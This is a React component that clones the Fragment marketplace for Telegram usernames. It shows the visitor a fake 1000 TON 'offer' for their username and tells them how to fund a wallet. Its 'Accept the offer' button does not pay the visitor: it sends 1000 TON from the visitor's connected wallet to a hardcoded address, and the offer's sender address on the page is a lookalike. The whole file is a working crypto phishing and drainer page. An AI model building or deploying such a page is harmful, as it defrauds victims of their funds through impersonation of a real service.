import React, { useState, useEffect } from 'react';
import { TonConnectButton, useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
import { Search, X, Diamond, ExternalLink, Info, RefreshCw } from 'lucide-react';

interface TonRates {
  TON: {
    prices: {
      USD: number;
    };
    diff_24h: {
      USD: string;
    };
    diff_7d: {
      USD: string;
    };
    diff_30d: {
      USD: string;
    };
  };
}

const FragmentClone: React.FC = () => {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [searchQuery, setSearchQuery] = useState('');
  const [showHowItWorks, setShowHowItWorks] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [tonRates, setTonRates] = useState<TonRates | null>(null);
  const [loading, setLoading] = useState(true);

  const username = 'main';
  const price = 1000.00000;
  const priceInTon = (price * 3221.85).toFixed(0);

  // Fetch TON rates
  const fetchTonRates = async () => {
    try {
      setLoading(true);
      const response = await fetch('https://tonapi.io/v2/rates?tokens=ton&currencies=usd');
      const data = await response.json();
      setTonRates(data.rates);
    } catch (error) {
      console.error('Failed to fetch TON rates:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTonRates();
    const interval = setInterval(fetchTonRates, 30000);
    return () => clearInterval(interval);
  }, []);

  const handleAcceptOffer = async () => {
    if (!wallet) {
      setShowWalletModal(true);
      return;
    }

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 360,
      messages: [
        {
          address: "UQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olI2a",
          amount: (price * 1e9).toString(),
          payload: ""
        }
      ]
    };

    try {
      await tonConnectUI.sendTransaction(transaction);
      alert('✅ To\'lov muvaffaqiyatli yuborildi!');
    } catch (error) {
      console.error('Payment failed:', error);
      alert('❌ To\'lov bajarilmadi. Qaytadan urinib ko\'ring.');
    }
  };

  const shouldShowUsername = () => {
    if (!searchQuery) return true;
    return username.toLowerCase().includes(searchQuery.toLowerCase()) || 
           searchQuery.toLowerCase().includes(username.toLowerCase());
  };

  return (
    <div className="min-h-screen bg-[#1a2026] text-[#8794a1]">
      {/* Header */}
      <header className="bg-[#212a33]/90 backdrop-blur-md border-b border-[#2e3a47] sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-12">
            {/* Logo */}
            <div className="flex items-center space-x-2">
              <Diamond className="w-5 h-5 text-white" />
              <span className="text-white font-bold text-lg">FRAGMENT</span>
            </div>

            {/* Search */}
            <div className="flex-1 max-w-md mx-8">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-[#8794a1]" />
                <input
                  type="text"
                  placeholder="Search phone numbers"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full bg-[#242e38] border border-[#2e3a47] rounded-lg pl-10 pr-4 py-2 text-white placeholder-[#8794a1] focus:outline-none focus:border-[#4db2ff] focus:ring-1 focus:ring-[#4db2ff]"
                />
              </div>
            </div>

            {/* Connect TON Button */}
            <div className="flex items-center">
              <TonConnectButton className="!bg-[#248bda] !text-white !border-none !rounded-lg !px-4 !py-2 !font-medium hover:!bg-[#207cc2] transition-colors" />
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {shouldShowUsername() ? (
          <div className="space-y-8">
            {/* Username Header */}
            <div className="text-center">
              <div className="inline-flex items-center space-x-2 mb-2">
                <h1 className="text-4xl font-bold text-white">{username}.t.me</h1>
                <span className="bg-green-500/20 text-green-400 px-2 py-1 rounded text-sm font-medium">
                  Claimed
                </span>
              </div>
              <button 
                onClick={() => setShowHowItWorks(true)}
                className="text-[#4db2ff] hover:underline text-sm"
              >
                Subscribe to updates
              </button>
            </div>

            {/* Offer Section */}
            <div className="bg-[#212a33] rounded-xl p-6 border border-[#2e3a47]">
              <div className="mb-6">
                <h2 className="text-lg font-semibold text-white mb-2">What is this?</h2>
                <div className="space-y-2 text-sm">
                  <p>
                    Someone offered 💎 {price.toLocaleString()} (~{priceInTon} for your username. 
                    If the price suits you, press "Accept the offer".
                  </p>
                  <button 
                    onClick={() => setShowHowItWorks(true)}
                    className="text-[#4db2ff] hover:underline"
                  >
                    How does this work?
                  </button>
                </div>
              </div>

              <button
                onClick={handleAcceptOffer}
                className="w-full bg-[#248bda] hover:bg-[#207cc2] text-white font-semibold py-3 px-6 rounded-lg transition-colors"
              >
                Accept the offer
              </button>
            </div>

            {/* User Info */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <div>
                  <h3 className="text-white font-medium mb-2">Telegram Username</h3>
                  <a href={`https://t.me/${username}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
                    <span>{username}</span>
                    <ExternalLink className="w-3 h-3" />
                  </a>
                </div>
                <div>
                  <h3 className="text-white font-medium mb-2">Web Address</h3>
                  <a href={`https://t.me/${username}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
                    <span>t.me/{username}</span>
                    <ExternalLink className="w-3 h-3" />
                  </a>
                </div>
              </div>
              <div>
                <h3 className="text-white font-medium mb-2">TON Web 3.0 Address</h3>
                <a href={`https://${username}.t.me`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
                  <span>{username}.t.me</span>
                  <ExternalLink className="w-3 h-3" />
                </a>
              </div>
            </div>

            {/* Latest Offers */}
            <div className="bg-[#212a33] rounded-xl p-6 border border-[#2e3a47]">
              <h2 className="text-lg font-semibold text-white mb-4">Latest Offers</h2>
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-[#2e3a47]">
                      <th className="text-left py-2 text-sm font-medium text-[#8794a1]">Offer</th>
                      <th className="text-left py-2 text-sm font-medium text-[#8794a1]">Date</th>
                      <th className="text-left py-2 text-sm font-medium text-[#8794a1]">From</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td className="py-3">
                        <div className="flex items-center space-x-2">
                          <Diamond className="w-4 h-4 text-[#4db2ff]" />
                          <span className="text-white font-medium">{price.toLocaleString()}</span>
                        </div>
                      </td>
                      <td className="py-3 text-sm">20 Jun 2025 at 10:46</td>
                      <td className="py-3">
                        <span className="text-[#4db2ff] text-sm">EQDnrjL3Mw4ikGWX...NbWTmn8VnTB-oINBf</span>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>

            {/* TON Price Display */}
            {tonRates && (
              <div className="bg-[#212a33] rounded-xl p-6 border border-[#2e3a47]">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-white flex items-center space-x-2">
                    <Diamond className="w-5 h-5 text-[#4db2ff]" />
                    <span>TON Narxi</span>
                  </h3>
                  <button 
                    onClick={fetchTonRates}
                    disabled={loading}
                    className="p-2 hover:bg-[#2e3a47] rounded-lg transition-colors"
                  >
                    <RefreshCw className={`w-4 h-4 text-[#8794a1] ${loading ? 'animate-spin' : ''}`} />
                  </button>
                </div>
                
                <div className="text-3xl font-bold text-white mb-3">
                  ${tonRates.TON.prices.USD.toFixed(4)}
                </div>
                
                <div className="grid grid-cols-3 gap-3 text-sm">
                  {[
                    { label: '24s', value: tonRates.TON.diff_24h.USD },
                    { label: '7kun', value: tonRates.TON.diff_7d.USD },
                    { label: '30kun', value: tonRates.TON.diff_30d.USD }
                  ].map((item, index) => {
                    const isPositive = item.value.startsWith('+');
                    const cleanValue = item.value.replace(/[+−-]/, '');
                    return (
                      <div key={index} className="flex items-center space-x-1">
                        <span className="text-[#8794a1]">{item.label}:</span>
                        <span className={`font-medium ${isPositive ? 'text-green-400' : 'text-red-400'}`}>
                          {cleanValue}
                        </span>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}
          </div>
        ) : (
          <div className="text-center py-12">
            <p className="text-[#8794a1]">Hech narsa topilmadi</p>
          </div>
        )}
      </main>

      {/* How it works Modal */}
      {showHowItWorks && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-[#212a33] rounded-xl p-6 max-w-md w-full border border-[#2e3a47]">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold text-white">How does this work?</h3>
              <button 
                onClick={() => setShowHowItWorks(false)}
                className="text-[#8794a1] hover:text-white"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="space-y-4 text-sm">
              <p>You have received an offer to sell your collectible number / username, follow the instructions:</p>
              <div className="space-y-2">
                <p><strong>To do so, simply:</strong></p>
                <p>• Get <span className="text-[#4db2ff]">Tonkeeper</span>, open it and create a wallet.</p>
                <p>• Deposit funds in your wallet from a <span className="text-[#4db2ff]">supported exchange</span> or with <span className="text-[#4db2ff]">@wallet</span> on Telegram.</p>
                <p>• Use <strong>Tonkeeper</strong> to log in on Fragment and return to this page.</p>
                <p>• Tap the button below to accept the offer</p>
              </div>
              <p className="text-xs text-[#8794a1]">Upon acceptance, the username / number offer will immediately take possession of the buyer.</p>
            </div>
            <button 
              onClick={() => setShowHowItWorks(false)}
              className="w-full mt-6 bg-[#248bda] hover:bg-[#207cc2] text-white font-medium py-2 px-4 rounded-lg transition-colors"
            >
              Close
            </button>
          </div>
        </div>
      )}

      {/* Wallet Modal */}
      {showWalletModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-[#212a33] rounded-xl p-6 max-w-md w-full border border-[#2e3a47]">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold text-white">Connect your wallet</h3>
              <button 
                onClick={() => setShowWalletModal(false)}
                className="text-[#8794a1] hover:text-white"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <p className="text-sm text-[#8794a1] mb-6 text-center">
              Open Wallet in Telegram or select your wallet to connect
            </p>
            
            <div className="space-y-4">
              <button className="w-full bg-[#248bda] hover:bg-[#207cc2] text-white font-medium py-3 px-4 rounded-lg transition-colors flex items-center justify-center space-x-2">
                <span>Open Wallet in Telegram</span>
                <ExternalLink className="w-4 h-4" />
              </button>
              
              <div className="grid grid-cols-4 gap-4">
                {['Tonkeeper', 'MyTonWallet', 'Tonhub', 'Bitget Wallet'].map((wallet) => (
                  <div key={wallet} className="text-center">
                    <div className="w-12 h-12 bg-[#2e3a47] rounded-lg flex items-center justify-center mb-2 mx-auto">
                      <Diamond className="w-6 h-6 text-[#4db2ff]" />
                    </div>
                    <span className="text-xs text-[#8794a1]">{wallet}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="bg-[#111417] border-t border-[#2e3a47] py-4 mt-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-center space-x-8 text-xs text-[#6d8394]">
            <a href="#" className="hover:text-[#4db2ff]">Top Auctions</a>
            <a href="#" className="hover:text-[#4db2ff]">About</a>
            <a href="#" className="hover:text-[#4db2ff]">Terms</a>
            <a href="#" className="hover:text-[#4db2ff]">Privacy</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default FragmentClone;